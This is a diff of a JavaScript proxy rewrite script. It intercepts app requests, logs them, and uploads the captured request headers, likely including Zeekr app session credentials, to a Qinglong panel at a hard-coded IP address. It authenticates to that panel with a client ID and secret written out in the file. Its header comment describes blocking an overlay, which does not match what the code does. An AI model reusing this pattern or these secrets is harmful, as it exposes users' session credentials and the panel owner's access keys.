@@ -1,43 +1,32 @@
-
-// taskReward.js屏蔽失败遮罩
+// taskReward.js 屏蔽失败遮罩
 let url = $request.url;
 let method = $request.method;
 let headers = $request.headers;
 let body = $request.body;
 
-let targetUrl = url;
-let options = {
-    url: targetUrl,
-    method: method,
-    headers: headers,
-    body: body
-};
-
-if((url && url !== undefined) && (method != "OPTIONS")){
-    
+if ((url && method !== "OPTIONS")) {
     try {
-        console.log(url);
-        console.log(method);
-        console.log(JSON.stringify(headers));
-        console.log(body);
+        console.log("请求 URL: " + url);
+        console.log("请求 Method: " + method);
+        console.log("请求 Headers: " + JSON.stringify(headers));
+        console.log("请求 Body: " + body);
 
         getQinglongToken();
-        
     } catch (e) {
-        console.log(e.message);
+        console.log("外部异常: " + e.message);
     }
-}else{
-    console.log(body);
+} else {
     $done();
 }
 
-async function fetchWithRetry(options, retries = 10, delay = 1000) {
+// ✅ fetchWithRetry 工具函数
+async function fetchWithRetry(options, retries = 5, delay = 1000) {
     for (let i = 0; i < retries; i++) {
         try {
             const response = await $task.fetch(options);
             return response;
         } catch (error) {
-            console.log(`$task.fetch failed (attempt ${i + 1}): ${error}`);
+            console.log(`$task.fetch 重试 (${i + 1}/${retries}) 失败: ${error}`);
             if (i < retries - 1) {
                 await new Promise(resolve => setTimeout(resolve, delay));
             } else {
@@ -47,100 +36,98 @@ async function fetchWithRetry(options, retries = 10, delay = 1000) {
     }
 }
 
-// 获取青龙token
+// ✅ 获取青龙 token
 async function getQinglongToken() {
     const tokenUrl = 'http://27.148.201.126:5800/open/auth/token';
     const tokenParams = new URLSearchParams({
         client_id: '_rk3h_o2x_EK',
         client_secret: 'ZE-KgDQ5Uwxsk4VRQ9iWsOON'
-    });
+    }).toString();
+
+    const options = {
+        url: `${tokenUrl}?${tokenParams}`,
+        method: 'GET'
+    };
 
     try {
-        const response = await fetchWithRetry(`${tokenUrl}?${tokenParams}`, {
-            method: 'GET'
-        });
+        const response = await fetchWithRetry(options);
         const data = JSON.parse(response.body);
-        const getTk = data.data.token;
-        console.log(getTk);
-        delates(getTk);
+        const token = data.data.token;
+        console.log("获取 token 成功: " + token);
+        delates(token);
     } catch (error) {
-        console.log(error);
+        console.log("获取 token 失败: " + error);
     }
 }
 
-// 更新变量
+// ✅ 删除 zeekr_headers_x 后再更新
 async function delates(token) {
-    const delates_url = 'http://27.148.201.126:5800/open/envs';
-    const delates_headers = {
+    const envsUrl = 'http://27.148.201.126:5800/open/envs';
+    const headers = {
         'Authorization': `Bearer ${token}`
     };
 
     try {
-        const response = await fetchWithRetry(delates_url, {
+        const response = await fetchWithRetry({
+            url: envsUrl,
             method: 'GET',
-            headers: delates_headers
+            headers: headers
         });
-        const data = JSON.parse(response.body);
-        const panduan = data.data;
 
-        // 删除变量
-        for (const item of panduan) {
+        const data = JSON.parse(response.body);
+        const envList = data.data;
+
+        for (const item of envList) {
             if (item.name === 'zeekr_headers_x') {
-                const delete_url = 'http://27.148.201.126:5800/open/envs';
-                
-                const delete_options = {
-                    url: delete_url,
+                const deleteOptions = {
+                    url: envsUrl,
                     method: 'DELETE',
                     headers: {
                         'Authorization': `Bearer ${token}`,
                         'Content-Type': 'application/json'
                     },
-                    // 将 id 包装成对象数组
                     body: JSON.stringify([item.id])
                 };
 
-                taskFetchWithRetry(delete_options).then(response => {
-                    update(token);
-                    console.log(response);  // 输出返回的响应
-                })
-                .catch(error => {
-                    console.log(`Error deleting variable: ${error}`);
-                });
+                try {
+                    const delRes = await fetchWithRetry(deleteOptions);
+                    console.log("删除成功: " + delRes.body);
+                    await update(token);
+                } catch (delErr) {
+                    console.log("删除失败: " + delErr);
+                }
             }
         }
     } catch (error) {
-        console.log(error);
+        console.log("查询环境变量失败: " + error);
     }
 }
 
-// 更新变量
-function update(token) {
-    const update_url = 'http://27.148.201.126:5800/open/envs';  // 青龙地址
-    let update_timestamp = new Date().toISOString();
-    
-    const update_data = [{
-        name: 'zeekr_headers_x',  // 变量名
-        value: JSON.stringify(headers),     // 变量值
-        remarks: update_timestamp   // 备注
+// ✅ 添加 zeekr_headers_x
+async function update(token) {
+    const updateUrl = 'http://27.148.201.126:5800/open/envs';
+    const timestamp = new Date().toISOString();
+
+    const updateData = [{
+        name: 'zeekr_headers_x',
+        value: JSON.stringify(headers),
+        remarks: `更新时间: ${timestamp}`
     }];
 
-    const update_options = {
-        url: update_url,
+    const updateOptions = {
+        url: updateUrl,
         method: 'POST',
         headers: {
             'Authorization': `Bearer ${token}`,
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify(update_data)
+        body: JSON.stringify(updateData)
     };
-    
-    fetchWithRetry(update_options, 10, 1000)
-    .then(async response => {
-        const resBody = await response.text();
-        console.log(resBody);
-    })
-    .catch(error => {
-        console.log(`Error updating variable: ${error}`);
-    });
-    
+
+    try {
+        const response = await fetchWithRetry(updateOptions);
+        console.log("更新成功: " + response.body);
+    } catch (error) {
+        console.log("更新失败: " + error);
+    }
 }
